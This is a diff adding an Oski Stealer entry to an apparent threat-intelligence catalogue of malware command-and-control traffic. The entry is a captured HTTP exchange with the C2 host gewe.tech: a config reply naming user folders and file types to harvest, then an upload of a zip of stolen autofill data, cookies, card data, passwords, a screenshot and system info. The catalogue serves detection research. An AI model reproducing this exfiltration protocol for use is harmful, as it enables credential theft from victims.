@@ -1818,6 +1818,86 @@ UEsDBBQAAAgIAIRp/k5nVtI5VAoAAABwAAAjAAAANGR6M3hiMHAuaGRhL0Nocm9tZS9E
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/origin.png "Origin Keylogger")
 
+#### Oski Stealer
+~~~
+POST /main.php HTTP/1.1
+Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
+Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
+Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1
+Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0
+Content-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A
+Content-Length: 25
+Host: gewe.tech
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+--1BEF0A57BE110FD467A--
+HTTP/1.1 200 OK
+Connection: Keep-Alive
+X-Powered-By: PHP/7.2.26
+Content-Type: text/html; charset=UTF-8
+Content-Length: 102
+Content-Encoding: gzip
+Vary: Accept-Encoding
+Date: Wed, 26 Feb 2020 11:23:13 GMT
+Server: LiteSpeed
+
+1;USERPROFILE\Downloads;*.dat,*.key,*.txt;1;LOCALAPPDATA\;*.dat,*.key,*.txt;1;APPDATA\;*.dat,*.key,*.txt;1;USERPROFILE\Documents;*.dat,*.key,*.txt;1;USERPROFILE\Desktop;*.dat,*.key,*.txt;
+
+POST / HTTP/1.1
+Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
+Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
+Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1
+Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0
+Content-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A
+Content-Length: 60097
+Host: gewe.tech
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+--1BEF0A57BE110FD467A
+Content-Disposition: form-data; name="file"; filename="_4052981232.zip"
+Content-Type: zip
+
+PK.........ZZP..*.#...&..."...autofill/Google Chrome_Default.txtUT
+..!UV^!UV^!UV^s.,*..K.M.tOL*.L....I...%..e....r..PK.........ZZP............-...autofill/Mozilla Firefox_qldyz51w.default.txtUT
+..!UV^!UV^!UV^..PK.........ZZP................cc/Google Chrome_Default.txtUT
+..!UV^!UV^!UV^..PK.........ZZP............!...cookies/Google Chrome_Default.txtUT
+..!UV^!UV^!UV^..PK.........ZZP..).........,...cookies/Mozilla Firefox_qldyz51w.default.txtUT
+..!UV^!UV^!UV^..KK.@...S.OI.{..YV.....5%.2.....vb...T..B.\]8........y..{.7....67.....\(..&C%:..F&.Ce.P5..k.#q.....b..?.`Y...kyW.Sv.B..Z.R=...[o..z^..uiR.-.eg..p.@g.....Y*..|...Q...cU..9R.J.
+)....r...!....
+Y.<.4.Pg...5..4"........@..]a.t.1.*.	*D..v<....._/..._ .......r......L"&.$C...x..PK.........ZZP8G..........
+...passwords.txtUT
+..!UV^ UV^ UV^...w.RpIMK,.)..
+.w..Rp..O.IUp.(..M......
+f....[.....%&.&..g.%....r........R+.
+.K@..\....P....bcS3^..(......*S.r..Tk}..2sr...2.R..+`..d..PK.........ZZP.dwtv...T.......screenshot.jpgUT
+..&UV^&UV^&UV^..u\TQ.5.. .."8 .. ... .CJJHJ..R
+.#...C.t.Jww..t.{...}?....}...9...93..k.u]{....,.....$.....
+......C....q........w0...X..a..=....S.....R...S>~BMJ............O... +..3.$(w.....E..M.........W...;....4...T\.4\..F...............B..q...=.A...*
+...-4t.[.....~.-\t<*......b<..>.	.~.Z...>.o......]L.G.D..t...L.\.<.|../$$..edU..54.^j...653..t|............._.a...Q.1.bSR.....Y.E.%.e...U.....[Z.......GF........W.................\........\...[h.0..BA}.6...N.~...
+......|.@.B....K....7r..$....../
+ye..]......?......`..._...D......s..7.....yFo.......S*	....z..z.%^.~..8.... ....&T<.s.<..s.2.y}[..L.....i...4..h..+..
+b6.Z.....U,.z0Xn.........K8.]...m_4..@...R.....Z..W.N...k~....+.....|....; *...6W'.....1f.....Y....,.5>!...m...7
+.R'.f.E.`.M.,k..<	ua..W.D.+.Q.W .q......d...k.
+...system.txtUT
+i...PK.........ZZP................_1.zipUT
+..&UV^!UV^!UV^PK....................PK...........ZZP..*.#...&...".	....... .......autofill/Google Chrome_Default.txtUT...!UV^PK...........ZZP............-.	....... ...t...autofill/Mozilla Firefox_qldyz51w.default.txtUT...!UV^PK...........ZZP..............	....... .......cc/Google Chrome_Default.txtUT...!UV^PK...........ZZP............!.	....... .......cookies/Google Chrome_Default.txtUT...!UV^PK...........ZZP..).........,.	....... ...q...cookies/Mozilla Firefox_qldyz51w.default.txtUT...!UV^PK...........ZZP8G..........
+.	....... .......passwords.txtUT...!UV^PK...........ZZP.dwtv...T.....	....... .......screenshot.jpgUT...&UV^PK...........ZZP.pv.r... 2..
+.	....... ...S...system.txtUT...&UV^PK...........ZZP..............	....... ......._1.zipUT...&UV^PK......	.	.....I.....
+--1BEF0A57BE110FD467A--
+
+HTTP/1.1 200 OK
+Connection: Keep-Alive
+X-Powered-By: PHP/7.2.26
+Content-Type: text/html; charset=UTF-8
+Content-Length: 0
+Date: Wed, 26 Feb 2020 11:23:19 GMT
+Server: LiteSpeed
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/oski1.png "Oski")
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/oski2.png "Oski")
+
 #### Ostap
 ~~~
 POST /angola/mabutu.php?pi=29h&tan=cezar&z=662343339&n=0&u=20&an=9468863238 HTTP/1.1
